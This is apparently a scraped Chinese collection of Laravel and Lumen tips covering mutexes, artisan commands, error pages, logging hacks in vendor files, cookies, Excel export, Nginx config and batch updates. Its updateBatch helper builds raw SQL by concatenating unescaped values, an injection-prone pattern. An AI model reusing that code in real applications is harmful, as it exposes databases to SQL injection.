分钟，这样就会导致在上一个任务还没结束的时候另一个相同的任务开始执行当我们在开会进行激烈的讨论时，我会从我桌子里拿出来一个尖叫鸡。只有手里拿着尖叫鸡的人才能说话，如果你没有拿着尖叫鸡你是不能说话的。你只能向会议主持人请示，只有在你拿到尖叫鸡的时候你才能说话否则只能等待。当你讲话完毕的时候，将尖叫鸡还给会议主持人，主持人会将尖叫鸡给到下一个人来让其说话。这样会确保人们不会互相交谈，同时他们也会有自己的时间来进行讲话。public function create(Event $event)&#123; return $this-&gt;cache-&gt;add($event-&gt;mutexName(), true, 1440);&#125;public function exists(Event $event)&#123; return $this-&gt;cache-&gt;has($event-&gt;mutexName());&#125;public function forget(Event $event)&#123; $this-&gt;cache-&gt;forget($event-&gt;mutexName());&#125;register_shutdown_function(function () &#123; $this-&gt;removeMutex();&#125;);https://learnku.com/articles/30550 创建一个命令1234567891011121314151617181920212223$ php artisan make:command HashCommand$signature 属性，设置命令名、命令参数、命令选项；$description 属性，设置命令的描述信息；handle() 方法，包含实际的命令逻辑代码。修改 $signature 属性，设置 hash 命令的命令名、命令参数、命令选项：protected $signature = 'hash &#123;text&#125; &#123;--U|uppercase&#125;'; public function handle() &#123; $text = $this-&gt;argument('text'); $uppercase = $this-&gt;option('uppercase'); $md5text = $uppercase ? strtoupper(md5($text)) : md5($text); $this-&gt;info("md5('&#123;$text&#125;') = $md5text"); &#125; $ php artisan hash "hello world"md5('hello world') = 5eb63bbbe01eeed093cb22bb8f5acdc3带上 -U 选项：$ php artisan hash "hello world" -Umd5('hello world') = 5EB63BBBE01EEED093CB22BB8F5ACDC3 自定义 Laravel 的 404 页面1234567891011121314151617181920212223242526272829303132333435app/Exceptions/Handler.php 文件中修改 render 方法public function render($request, Exception $exception)&#123; if ($this-&gt;isHttpException($exception)) &#123; if ($exception-&gt;getStatusCode() == 404) &#123; return response()-&gt;view('errors.' . '404', [], 404); &#125; &#125; return parent::render($request, $exception);&#125;创建一个新的视图 errors/404.blade.php 。public function render($request, Exception $exception)&#123; if ($this-&gt;isHttpException($exception)) &#123; if (view()-&gt;exists('errors.' . $exception-&gt;getStatusCode())) &#123; return response()-&gt;view('errors.' . $exception-&gt;getStatusCode(), [], $exception-&gt;getStatusCode()); &#125; &#125; return parent::render($request, $exception);&#125;创建一个 自定义异常 。运行以下代码来创建一个名为 TestingHttpException 的异常。php artisan make:exception TestingHttpException在 app/Exceptions/Handler.php 文件中，修改 render 方法。public function render($request, Exception $exception)&#123; if ($exception instanceof TestingHttpException) &#123; return response()-&gt;view('errors.testing'); &#125; return parent::render($request, $exception);&#125;如果异常是 TestingHttpException 的实例，它将返回 errors.testing 视图。https://learnku.com/laravel/t/27873 图片处理1234567891011121314151617181920212223composer require intervention/image https://learnku.com/laravel/t/30978 // 创建一张空的画布，像素3628x1757，背景白色 $img = Image::canvas(3628, 1757, '#fff'); // 获取本地图片，可以获取input上传文件 $leftImage = Image::make(base_path().'/public/p.jpg')-&gt;resize(2255, 1305); $rightImage = Image::make(base_path().'/public/f.jpg')-&gt;resize(1000, 1000); // 插入到画布，left-top是距离左侧和顶部，值对应的是后面 100 100 处 $img-&gt;insert($leftImage, 'left-top', 100, 100); $img-&gt;insert($rightImage, 'right-top', 100, 250); // 插入文本，通过回调设置参数，file上传的是字体库，需要自己下载放入 $img-&gt;text('王*军 320830**********542', 1757, 1550, function($font) &#123; $font-&gt;file(base_path().'/public/fzjw.ttf'); $font-&gt;size(160); $font-&gt;color('#000'); $font-&gt;align('center'); $font-&gt;valign('top'); $font-&gt;angle(0); &#125;); //可以直接返回图像，也可通过$img-&gt;save()进行保存图片 return $img-&gt;response('jpg'); 取消事件触发123456789101112131415161718192021222324252627//获取model里面的事件$dispatcher = YourModel::getEventDispatcher();//禁用model里面的事件YourModel::unsetEventDispatcher();// 调用model的save方法$yourInstance-&gt;save();//启用事件YourModel::setEventDispatcher($dispatcher);//Visitor model有saved事件，某些地方某些情况监听到后做一些其他操作protected $dispatchesEvents = [ 'saved' =&gt; VisitorSavedEvent::class, ];//有时候不需要触发事件，是可以取消的，可以调用model的update方法避开save()或者取消事件（推荐后者）。// 获取来访信息 $visitor = Visitor::where('id', $request-&gt;visitor_id)-&gt;first();//取消事件触发https://learnku.com/articles/31490$dispatcher = Visitor::getEventDispatcher();Visitor::unsetEventDispatcher();$ret = $visitor-&gt;save();Visitor::setEventDispatcher($dispatcher);//5.7YourModel::withoutEvents(function()&#123; // do something...&#125;); 记录memcache mongodb运行时间cache \vendor\laravel\framework\src\Illuminate\Cache\Repository.phppublic function __construct(Store $store) &#123; $this-&gt;start = microtime(true); $this-&gt;store = $store; &#125;protected function fireCacheEvent($event, $payload) &#123; /** * 添加cache响应时间 */ $total = round((microtime(true) - $this-&gt;start) * 1000, 2); $payload[] = $total; if (isset($this-&gt;events)) &#123; $this-&gt;events-&gt;fire('cache.'.$event, $payload); &#125; &#125; public function put($key, $value, $minutes) &#123; $this-&gt;start = microtime(true); $minutes = $this-&gt;getMinutes($minutes); if ( ! is_null($minutes)) &#123; $this-&gt;store-&gt;put($key, $value, $minutes); $this-&gt;fireCacheEvent('write', [$key, $value, $minutes]); &#125; &#125;vendor\laravel\framework\src\Illuminate\Database\Eloquent\Model.phppublic function __construct(array $attributes = array()) &#123; if($this-&gt;connection == "mongodb") &#123; $this-&gt;_time_cost_start = microtime(true); &#125; $this-&gt;bootIfNotBooted(); $this-&gt;syncOriginal(); $this-&gt;fill($attributes); &#125; public function save(array $options = array()) &#123; if($this-&gt;connection == "mongodb") &#123; $this-&gt;_time_cost_start = microtime(true); &#125; */ protected function performInsert(Builder $query, array $options = []) &#123; if ($this-&gt;fireModelEvent('creating') === false) return false; if ($this-&gt;timestamps &amp;&amp; array_get($options, 'timestamps', true)) &#123; $this-&gt;updateTimestamps(); &#125; $attributes = $this-&gt;attributes; $conn = $query-&gt;getModel()-&gt;connection; if($conn == "mongodb") &#123; unset($attributes['_time_cost_start']); unset($attributes['_time_cost_total']); &#125;protected function fireModelEvent($event, $halt = true) &#123; if ( ! isset(static::$dispatcher)) return true; /** * 将监听事件类名去掉，去掉class * 添加mongodb响应时间 */ //$event = "eloquent.&#123;$event&#125;: ".get_class($this); $event = "eloquent.&#123;$event&#125;"; $method = $halt ? 'until' : 'fire'; if($this-&gt;connection == "mongodb") &#123; $this-&gt;_time_cost_total = round((microtime(true) - $this-&gt;_time_cost_start) * 1000, 2); &#125; return static::$dispatcher-&gt;$method($event, $this); &#125; //Mysql event handle $app['events']-&gt;listen('illuminate.query',function($sql, $binds, $time,$name) use ($app)&#123; self::HandleMysqlSysLog($sql, $binds, $time, $name, $app); &#125;); //MongoDB event handle $app['events']-&gt;listen('eloquent.saved',function($model) use ($app)&#123; self::MongodbSysLog('saved', $app, $model); &#125;); $app['events']-&gt;listen('eloquent.deleted',function($model) use ($app)&#123; self::MongodbSysLog('deleted', $app, $model); &#125;); //Memcache event handle $app['events']-&gt;listen('cache.write',function($key, $value, $time, $total) use ($app)&#123; self::MemcacheSysLog('put',$key,$total); &#125;); $app['events']-&gt;listen('cache.delete',function($key, $total) use ($app)&#123; self::MemcacheSysLog('delete',$key,$total); &#125;); $app['events']-&gt;listen('cache.hit',function($key, $value, $total) use ($app)&#123; self::MemcacheSysLog('get',$key,$total); &#125;); $app['events']-&gt;listen('cache.missed',function($key, $total) use ($app)&#123; self::MemcacheSysLog('missed',$key,$total); &#125;); public static function MysqlSysLog($sql, $binds, $time, $name, $app)&#123; foreach ($binds as $bind) &#123; $sql = preg_replace('/\?/', '\'' . $bind . '\'', $sql, 1); &#125; //调用select时先判断使用读库还是写库，而insert/update/delete统一使用写库 Illuminate/Database/Connectors/ConnectionFactory.php Illuminate/Database/Connection.php $connection = $app['db']-&gt;getconnections(); if ($name) &#123; if (preg_match('#^select[\s\S]*$#', $sql, $match)) &#123; $pdo = $connection[$name]-&gt;getreadPdo(); $host = explode(' ', $pdo-&gt;getAttribute(\PDO::ATTR_CONNECTION_STATUS))[0]; $server_info = $pdo-&gt;getAttribute(\PDO::ATTR_SERVER_INFO); &#125; else &#123; $pdo = $connection[$name]-&gt;getpdo(); $host = explode(' ', $pdo-&gt;getAttribute(\PDO::ATTR_CONNECTION_STATUS))[0]; $server_info = $pdo-&gt;getAttribute(\PDO::ATTR_SERVER_INFO); &#125; $data = [ 'rs' =&gt; 'mysql://' . $host.':'.$connection[$name]-&gt;getconfig('port') . '/' . $connection[$name]-&gt;getconfig('name'), 'cmd' =&gt; $sql, 'output_content' =&gt; [ 'database' =&gt; $connection[$name]-&gt;getconfig('database'), 'host' =&gt; $host, 'name' =&gt; $connection[$name]-&gt;getconfig('name'), 'port' =&gt; $connection[$name]-&gt;getconfig('port'), 'driver' =&gt; $connection[$name]-&gt;getconfig('driver'), 'server_info' =&gt; $server_info ], 't_total' =&gt; $time ]; self::SaveSysLog($data); &#125; &#125; public static function MemcacheSysLog($cmd, $key, $total)&#123; if(app('cache')-&gt;getStore() instanceof \Illuminate\Cache\MemcachedStore)&#123; $servers = implode('/', array_keys(app('cache')-&gt;getMemcached()-&gt;getStats())); $data = [ 'rs' =&gt; 'mc://' . $servers, 'cmd' =&gt; $cmd . ' ' . $key, 't_total' =&gt; $total, 'code' =&gt; 0 ]; &#125; self::SaveSysLog($data); &#125; public static function MongodbSysLog($cmd, $app, $model)&#123; $connection = $app['db']-&gt;getconnections(); if(isset($connection['mongodb'])) &#123; $data = [ 'rs' =&gt; 'Mongo://' . $connection['mongodb']-&gt;getconfig('host') . ':' . $connection['mongodb']-&gt;getconfig('port') , 'cmd' =&gt; $cmd, 'output_content' =&gt; [ 'database' =&gt; $connection['mongodb']-&gt;getconfig('database'), 'host' =&gt; $connection['mongodb']-&gt;getconfig('host'), 'port' =&gt; $connection['mongodb']-&gt;getconfig('port'), 'driver' =&gt; $connection['mongodb']-&gt;getconfig('driver') ], 't_total' =&gt; $model-&gt;_time_cost_total, 'rs_content' =&gt; $model-&gt;toArray()['_id'] ]; &#125; self::SaveSysLog($data); &#125; public static function SaveSysLog($data)&#123; if(php_sapi_name()=='cli')&#123; return ; &#125; openlog('app',LOG_PID|LOG_ODELAY,LOG_LOCAL6); try&#123; syslog(LOG_INFO,json_encode($data)); &#125; catch (\Exception $e) &#123; \Log::info('syslog_error', ['data' =&gt; $data]); &#125; closelog(); &#125; vendor/laravel/framework/src/Illuminate/Cache/MemcachedStore.php:164 public function get($key) &#123; $this-&gt;start = microtime(true); $value = $this-&gt;memcached-&gt;get($this-&gt;prefix.$key); //$total = round((microtime(true) - $this-&gt;start) * 1000, 2); $this-&gt;end = microtime(true); $this-&gt;handleMcSysLog('get', $key); if ($this-&gt;memcached-&gt;getResultCode() == 0) &#123; return $value; &#125; &#125; private function handleMcSysLog($cmd, $key) &#123; $total = round(($this-&gt;end - $this-&gt;start) * 1000, 2); $rs = implode('/', array_keys($this-&gt;memcached-&gt;getStats())); $data = [ 'rs' =&gt; 'mc://' . $rs, 'rs_type' =&gt; 6, 'cmd' =&gt; $cmd . ' ' . $key, 't_total' =&gt; $total, 'code' =&gt; $this-&gt;memcached-&gt;getLastErrorCode(), 'ext' =&gt; $this-&gt;memcached-&gt;getLastErrorMessage() ]; &#125; 记录Redis运行时间12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879predisuse \Predis\Command\CommandInterface;use \Predis\Connection\StreamConnection;class RedisLog extends StreamConnection&#123; private $tstart = 0; private $debugBuffer = array(); public function connect() &#123; $this-&gt;tstart = microtime(true); parent::connect(); &#125; private function storeDebug(CommandInterface $command, $direction) &#123; $firtsArg = $command-&gt;getArguments(); $timestamp = round((microtime(true) - $this-&gt;tstart) * 1000,2); $log = []; $log['cmd'] = $command-&gt;getId(); $log['key'] = isset($firtsArg) ? $firtsArg : ' '; $log['server'] = "$direction $this"; $log['time'] = $timestamp; dump(['rs' =&gt; 'redis://' . trim($log['server']), 'cmd' =&gt; $command-&gt;getId(), 't_total' =&gt; $timestamp]); // $this-&gt;debugBuffer[] = &amp;$log; unset($log); &#125; public function writeRequest(CommandInterface $command) &#123; $this-&gt;tstart = microtime(true);//执行命令行的时候重新算 这样就不会叠加 parent::writeRequest($command);// $this-&gt;storeDebug($command, '-&gt;'); &#125; public function readResponse(CommandInterface $command) &#123; $response = parent::readResponse($command); $this-&gt;storeDebug($command, ''); return $response; &#125; public function getDebugBuffer() &#123; return $this-&gt;debugBuffer; &#125; public static function debug() &#123; $options = array( 'connections' =&gt;[ 'tcp' =&gt; '\App\Services\RedisLog', ], ); $client = new \Predis\Client(config('database.redis'), $options); $client-&gt;get('redis:test'); var_export($client-&gt;getConnection()); /* OUTPUT: array ( 0 =&gt; 'SELECT 15 -&gt; 127.0.0.1:6379 [0.0008s]', 1 =&gt; 'SELECT 15 &lt;- 127.0.0.1:6379 [0.001s]', 2 =&gt; 'SET foo -&gt; 127.0.0.1:6379 [0.001s]', 3 =&gt; 'SET foo &lt;- 127.0.0.1:6379 [0.0011s]', 4 =&gt; 'GET foo -&gt; 127.0.0.1:6379 [0.0013s]', 5 =&gt; 'GET foo &lt;- 127.0.0.1:6379 [0.0015s]', 6 =&gt; 'INFO -&gt; 127.0.0.1:6379 [0.0019s]', 7 =&gt; 'INFO &lt;- 127.0.0.1:6379 [0.0022s]', ) */ &#125;&#125; 记录guggle运行时间1234567891011121314151617181920212223242526272829303132333435363738use Illuminate\Http\Request;use GuzzleHttp\Event\EmitterInterface;use GuzzleHttp\Event\BeforeEvent;use GuzzleHttp\Event\CompleteEvent;use GuzzleHttp\Event\EndEvent;use GuzzleHttp\Event\Emitter;class GuzzleEmitter extends Emitter&#123; public function __construct($rs_info = 'api_time') &#123; $start = 0; $this-&gt;on('before', function (BeforeEvent $event, $name) use(&amp;$start, $rs_info)&#123; $start = microtime(true); &#125;); $this-&gt;on('end', function (EndEvent $event) use(&amp;$start, $rs_info)&#123; $url = $event-&gt;gettransferInfo()['url']; $parse = parse_url($url); if ($event-&gt;getException()) &#123; dump(['rs' =&gt; $url, 'ext1' =&gt; sprintf('%s://%s%s',$parse['scheme'],$parse['host'],$parse['path']), 'cmd' =&gt; $event-&gt;getRequest()-&gt;getmethod(), 'code' =&gt; $event-&gt;gettransferInfo()['http_code'], 't_total' =&gt; intval((microtime(true)-$start)*1000), 'p_ip' =&gt; $event-&gt;gettransferInfo()['primary_ip'], 'req_id'=&gt;defined('REQUEST_ID')?(REQUEST_ID):'',]); &#125; else &#123; $method=$event-&gt;getRequest()-&gt;getmethod(); $post_data=($method=='POST')?((string)$event-&gt;getRequest()-&gt;getBody()):''; dump([ 'rs' =&gt; $url, 'cmd' =&gt; $method, 'code' =&gt; $event-&gt;gettransferInfo()['http_code'], 't_total' =&gt; intval((microtime(true)-$start)*1000), 'p_ip' =&gt; $event-&gt;gettransferInfo()['primary_ip'], 'rs_content'=&gt;$post_data, 'ext1' =&gt; sprintf('%s://%s%s',$parse['scheme'],$parse['host'],$parse['path']), 'req_id'=&gt;defined('REQUEST_ID')?(REQUEST_ID):'', ]); &#125; &#125;); &#125;&#125; 未加密的 Cookie123456789101112默认情况下，Laravel 生成的所有 cookie 都是经过加密和签名的，防止被非法篡改。但 Laravel 也支持不对 cookie 加密，具体做法如下：修改 app/Http/Middleware 目录中 App\Http\Middleware\EncryptCookies 中间件的 $except 属性，该属性是个数组，把不需加密的 cookie 名加入到该数组属性中就可以了：/** * 不需要被加密的cookies名称 * * @var array */protected $except = [ 'cookie_name',]; 无法获取 cookie12345678910111213//获取cookie的三种尝试Cookie::get('cookie_name');request()-&gt;cookie('cookie_name');$request-&gt;cookie('cookie_name')；//返回值均为null laravel 设置 cookie 是加密之后的，而我获取的 cookie 是外来 cookie，由于解密失败，所以怎么获取都是空https://learnku.com/laravel/t/31939//添加到cookie名称到 App\Http\Middleware\EncryptCookies 的 排除名单 中：class EncryptCookies extends Middleware&#123; protected $except = [ 'cookie_name', ];&#125; Laravel Excel 导出 csv12345678910111213Laravel Excel 2.0 的版本和 3.0 的版本有很大的区别，使用 composer 加载的时候要注意版本，3.0 和 2.0 的语法基本不同了composer require maatwebsite/excel ~2.1php artisan vendor:publish --provider="Maatwebsite\Excel\ExcelServiceProvider" config/excel.php 中找到 csv，把里面的 use_bom=&gt;false 改为 use_bom=&gt;true，这样导出的 csv 文件就会有 bom 头，不会出现乱码。Excel::create(iconv('UTF-8', 'GBK', '文章点赞数据'),function ($excel) use($params)&#123; $excel-&gt;sheet('score',function ($sheet) use($params)&#123; $sheet-&gt;rows($params); &#125;); &#125;)-&gt;export('csv');https://learnku.com/articles/32002按照 semver https://semver.org/lang/zh-CN/ 的规则，主版本号本来就是做不兼容 API 修改的，升级了主版本号，语法当然不一样了。这不算是坑，只是你不了解而已。https://github.com/rap2hpoutre/fast-excel maatwebsite/excel 感觉太耗内存了 项目开发规范12345678910111213141516171819202122232425262728293031常用的 HTTP 动词有下面五个。GET（SELECT）：从服务器取出资源（一项或多项）。POST（CREATE）：在服务器新建一个资源。PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。DELETE（DELETE）：从服务器删除资源。所有 URL 必须 是全小写，所有的路由都要用 name Route::get('user/create','UserController@create')-&gt;name('admin.user.create');一个是打开 create 页面的请求，一个是 create 数据的请求，其中的路由规范如下：路由采用 reseful API 的设计规范 Route::get('member/create', 'MemberController@create')-&gt;name('admin.member.create'); Route::post('member/store', 'MemberController@store')-&gt;name('admin.member.store');ORM 的设计规范框架的 ORM 只单纯的做模型关联使用，另外新建 Repsitory 层做数据库的逻辑处理，Repsitory 的命名采用驼峰法命令规范，比如&lt;?phpnamespace App\Repository\Admin;use App\Models\User;class UserRepository &#123;Controller 的设计规范数据验证在 request 层进行处理，保证进行控制器的数据是干净的。对于数据的处理则调用对应的 Repsitory 层处理，控制器只做响应和返回对应的数据。https://learnku.com/articles/32141 Laravel 中 Facade123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102Route::get('/', function () &#123; return view('welcome');&#125;);这里 Route 就是用 Facade 实现类方法 get 的静态调用。Laravel 中的 Facade 解决类什么问题？在 php 中，很多情况都需要使用一个容器获取到所有的对象，然后再调用改对象的方法，这样在编写代码的时候就会看到很长的一个调用链。例如:在 Yii2 中，几乎所有的系统类都是在 app 容器当中，对这些系统类进行操作都需要执行 Yii::$app-&gt;route 获取到类实例，然后在执行方法 Yii::$app-&gt;route-&gt;get()。但是如果用 Facade 实现之后的调用就是 Route::get()。这样的写法是的代码更加简洁。Laravel 中 Facade 是怎么实现的？思路是通过__callStatic 魔术方法将方法调用代理到实际的对象方法中去。abstract class Facade&#123; ... public static function getFacadeRoot() &#123; return static::resolveFacadeInstance(static::getFacadeAccessor()); &#125; ... protected static function resolveFacadeInstance($name) &#123; if (is_object($name)) &#123; return $name; &#125; if (isset(static::$resolvedInstance[$name])) &#123; return static::$resolvedInstance[$name]; &#125; return static::$resolvedInstance[$name] = static::$app[$name]; &#125; ... public static function getFacadeAccessor()&#123; //子类返回类名 &#125; public static function __callStatic($method, $args) &#123; $instance = static::getFacadeRoot(); if (! $instance) &#123; throw new RuntimeException('A facade root has not been set.'); &#125; return $instance-&gt;$method(...$args); &#125;&#125;class Route extends Facade&#123; public static function getFacadeAccessor()&#123; return 'router'; &#125;&#125;根据每个 Facade 中提供的 getFacadeAccessor 返回实际的对象类名，获取类对象。每个类对象一旦创建，就放在一个静态数组中，因此在一次请求中最多只会被创建一次。有没有其他的实现方式？从上面的代码可以看到，其实核心就是一个静态代理的功能。那么有没有其他的实现方式了呢？class Facade&#123; public static $instance; public static function getFacadeRoot() &#123; return static::resolveFacadeInstance(static::getFacadeAccessor()); &#125; protected static function resolveFacadeInstance($name) &#123; if (is_object($name)) &#123; return $name; &#125; if (isset(static::$instance)) &#123; return static::$instance; &#125; return static::$instance = static::$app[$name]; &#125; public static function __callStatic($method, $args) &#123; $instance = static::getFacadeRoot(); if (! $instance) &#123; throw new RuntimeException('A facade root has not been set.'); &#125; return $instance-&gt;$method(...$args); &#125; &#125;class Route extends Facade&#123;&#125;可以看出，上面的方式也能够实现静态代理，类似于 Facade 的功能。都是通过魔术方法实现。作用上，都简化了代码编写。两种不同实现方式的区别第二种实现方式有一个很大的缺点，那就是必须继承 Facade 类。PHP 本身只能继承一个类，所以第二种实现方式对于一些需要继承其他类的对象是不适合的。https://learnku.com/articles/31964 Laravel 默认邮箱登录改成用户名登录123456789101112131415161718192021222324252627282930默认的，Laravel 使用的是 Illuminate\Foundation\Auth\AuthenticatesUsers 这个 trait 完成登录功能的。通过观察 AuthenticatesUsers 的代码，发现下面一段很有意思的代码: protected function validateLogin(Request $request) &#123; $this-&gt;validate($request, [ $this-&gt;username() =&gt; 'required|string', 'password' =&gt; 'required|string', ]); &#125; public function username() &#123; return 'email'; &#125;可以看到，是应为 trait 里定义了用户名就是 email，所以才会使得验证的时候通过用户邮箱验证。所以我们只需要定义一个 trait，覆盖 AuthenticatesUsers 中的 username() 方法即可实现后端代码通过用户名验证登录。新增的 trait 代码namespace App\Utils;use Illuminate\Foundation\Auth\AuthenticatesUsers as LaravelAuthenticatesUsers;trait AuthenticatesUsers &#123; use LaravelAuthenticatesUsers; public function username() &#123; return 'name'; &#125;&#125;其实还有另一个简单的修改方式，直接在 LoginController 中新增 username() 方法。由于当前定义方法会覆盖 trait 的方法，因此也能达到修改的目的。但是会破坏登录代码的整体一致性，所以最好还是通过新增 trait 的方式实现。同时要记得修改前端 blade 文件中对输入参数的验证，然后就可以使用用户名登录了 https://learnku.com/articles/32431 设置错误等级12345678910111213141516171819202122 /vendor/laravel/framework/src/Illuminate/Foundation/Bootstrap/HandleExceptions.php:12public function bootstrap(Application $app) &#123; $this-&gt;app = $app; if ($app-&gt;environment('production')) &#123; error_reporting(E_ERROR); &#125; else &#123; error_reporting(-1); &#125; set_error_handler([$this, 'handleError']); set_exception_handler([$this, 'handleException']); register_shutdown_function([$this, 'handleShutdown']); if ( $app-&gt;environment('production')) &#123; ini_set('display_errors', 'Off'); &#125; &#125; 图片添加水印123456789composer require intervention/image在我的测试图片文件夹 images 里有一张主图 main.png 和一张水印图 watermark.png。public function addWatermark()&#123; $img = Image::make(public_path('images/main.png')); $img-&gt;insert(public_path('watermark.png'),'bottom-right',10, 10); $img-&gt;save();&#125;https://learnku.com/laravel/t/32414 Laravel 配置二级目录访问12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970域名 http://test.local 正常访问，对应项目地址 E:/Project/Test域名 http://test.local/module2 正常访问，对应项目地址 E:/Project/Module2废话不说上配置https://learnku.com/articles/32499Nginx 配置文件 test_local.confserver &#123; listen 80; server_name test.local; root E:/Project/Test; index index.php index.html; # 转发到端口 location /module2/ &#123; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Real-PORT $remote_port; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Host $proxy_host; proxy_set_header X-Forwarded-Port $proxy_port; proxy_pass http://127.0.0.1:8081/; &#125; location / &#123; try_files $uri $uri/ /index.php?$query_string; &#125; location ~ \.php$ &#123; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125;&#125;server &#123; listen 8081; server_name 127.0.0.1; root E:/Project/Module2; index index.php index.html; location / &#123; try_files $uri $uri/ /index.php?$query_string; &#125; location ~ \.php$ &#123; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125;&#125;module2 的 Laravel 配置 Url.envAPP_URL=http://test.local/module2app/Providers/AppServiceProvider public function boot() &#123; // 用于修正URL生成的链接 app('url')-&gt;forceRootUrl(config('app.url')); &#125; public function register() &#123; // 用于修正分页的链接 \Illuminate\Pagination\Paginator::currentPathResolver(function () &#123; return $this-&gt;app['url']-&gt;current(); &#125;); &#125; Lumen 日志自定义123456789101112131415161718192021222324252627282930311、在 Providers 目录建立 LogServiceProvider.php 文件 代码如下&lt;?phpnamespace App\Providers;use Carbon\Laravel\ServiceProvider;use Monolog\Formatter\LineFormatter;use Monolog\Handler\RotatingFileHandler;use Monolog\Processor\IntrospectionProcessor;class LogServiceProvider extends ServiceProvider&#123; public function boot() &#123; $handlers[] = (new RotatingFileHandler(storage_path('logs/lumen.log'), 0)) -&gt;pushProcessor(new IntrospectionProcessor()) -&gt;setFormatter(new LineFormatter(null, null, true, true)); $this-&gt;app['log']-&gt;setHandlers($handlers); &#125;&#125;2、在 bootstrap/app.php 注册该服服 $app-&gt;register(App\Providers\LogServiceProvider::class);3、使用测试 app('log')-&gt;info('我是测试日志');4、生成的日志信息[2018-04-11 10:25:29.313456] local.INFO: 我是来测试日志的 &#123;"content":1111&#125; https://learnku.com/articles/32543 Lumen 实时记录 SQL12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455561、在 Listeners 目录新建 QueryListener.php 文件 代码如下：&lt;?phpnamespace App\Listeners;use Illuminate\Database\Events\QueryExecuted;class QueryListener&#123; public function handle(QueryExecuted $event) &#123; if (env('APP_ENV', 'production') == 'local') &#123; $sql = str_replace('?', "'%s'", $event-&gt;sql); $log = vsprintf($sql, $event-&gt;bindings); $this-&gt;put_log('sql', $log); &#125; &#125; private function put_log($file = 'app', $content = '') &#123; $data = date('Y-m-d'); $cut_line = str_repeat("-", 100); is_dir(storage_path('logs/sql')) or mkdir (storage_path('logs/sql'), 0777, true); // 文件夹不存在则创建 $content = '[' . date('Y-m-d H:i:s') . "]" . $content; @file_put_contents(storage_path('logs/sql/' . $file . '-' . $data . '.log'), $content . "\n" . $cut_line . "\n\n", FILE_APPEND); &#125;&#125;2、在 Providers/EventServiceProvider.php 添加如下代码&lt;?phpnamespace App\Providers;use Laravel\Lumen\Providers\EventServiceProvider as ServiceProvider;class EventServiceProvider extends ServiceProvider&#123; /** * The event listener mappings for the application. * * @var array */ protected $listen = [ 'Illuminate\Database\Events\QueryExecuted' =&gt; [ 'App\Listeners\QueryListener' ], ];&#125;3、在 bootstrap/app.php 文件中开启 EventServiceProvider 注册即可 $app-&gt;register(App\Providers\EventServiceProvider::class);4、接下来写一个 sql 语句就能在 storage/logs/sql 看到生成的 sql 日志了 app('db')-&gt;where('id', '&gt;', '5')-&gt;get();https://learnku.com/articles/32540 替换 Word 里面变量并导出 PDF12345678910111213141516171819202122232425262728293031 composer require phpoffice/phpworduse PhpOffice\PhpWord\TemplateProcessor; $path = storage_path('aa.docx'); // 生成world 存放目录 $filePath = storage_path('contract.docx'); // 声明模板象并读取模板内容 $templateProcessor = new TemplateProcessor($path); // 替换模板内容 $templateProcessor-&gt;setValue('contract', '北京乙方'); // 乙方 // 生成新的 world $templateProcessor-&gt;saveAs($filePath); apt-get install unoconv #如果报错请求服务器语言设置为 LANG=”en_US.UTF-8″ #使用命令把 word 转为 pdf unoconv -f pdf aa.docx #这个时候在当前目录下就会有一个 aa.pdf 的文件出来 #但是会发现如果是中文的情况下转出来的 pdf 是乱码该如何解决 # 把电脑本机的宋体上传到服务器字体目录下 /usr/share/fonts 新建一个目录 win 或者其它，把中文字体上传到该目录下 apt-get install mkfontscale #安装这个工具 # 进入到/usr/share/fonts/win/ 执行命令 mkfontscale &amp;&amp; sudo mkfontdir &amp;&amp; sudo fc-cache -fv # 然后重启服务器让字体生效 reboot # 最后在执行 unoconv -f pdf aa.docx # 看是不是中文乱码的问题解决了 使用 php 的执行 shell 的函数来调用该函数自动生成即可 shell_exec('/usr/binunoconv -f pdf aa.docx') 主键进行批量更新1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768/** * 根据Id批量更新数据，可以放在model里面，使得每个model都是调用这个方法 * @author yezi * @param array $multipleData * @return bool */ public static function updateBatch($multipleData = array()) &#123; $tableName = \DB::getTablePrefix() . app(Contract::class)-&gt;getTable(); if(!is_array($multipleData))&#123; throw new CustomValidationException('must be an array',null,'6001'); &#125; foreach ($multipleData as &amp;$row)&#123; if(!array_key_exists('id',$row))&#123; throw new CustomValidationException('参数错误,缺少主键',null,'6001'); &#125; $row[Model::FIELD_UPDATED_AT] = Carbon::now(); &#125; if ($tableName &amp;&amp; !empty($multipleData)) &#123; $updateColumn = array_keys($multipleData[0]); $referenceColumn = $updateColumn[0]; unset($updateColumn[0]); $whereIn = ""; $q = "UPDATE " . $tableName . " SET "; foreach ($updateColumn as $uColumn) &#123; $q .= $uColumn . " = CASE "; foreach ($multipleData as $data) &#123; $q .= "WHEN " . $referenceColumn . " = " . $data[$referenceColumn] . " THEN '" . $data[$uColumn] . "' "; &#125; $q .= "ELSE " . $uColumn . " END, "; &#125; foreach ($multipleData as $data) &#123; $whereIn .= "'" . $data[$referenceColumn] . "', "; &#125; $q = rtrim($q, ", ") . " WHERE " . $referenceColumn . " IN (" . rtrim($whereIn, ', ') . ")"; return \DB::update(\DB::raw($q)); &#125; else &#123; return false; &#125; &#125;https://geixue.com/blogs/channels/laravel/laravel-shares-a-way-to-do-bulk-updates-based-on-the-primary-key-qjhqc5 Laradock 中使用 beanstalkd12345678910111213141516171819202122232425262728293031323334docker-compose up -d beanstalkdcomposer require pda/pheanstalk更改 .env 文件设置 QUEUE_CONNECTION 为 beanstalkd, 设置 beanstalkd 为默认队列驱动。新增配置项 QUEUE_HOST=beanstalkd，代表使用 laradock 中 beanstalkd 的 host 以及端口，端口默认值为 11300。QUEUE_HOST=beanstalkd QUEUE_CONNECTION=beanstalkd更改 config/queue.php 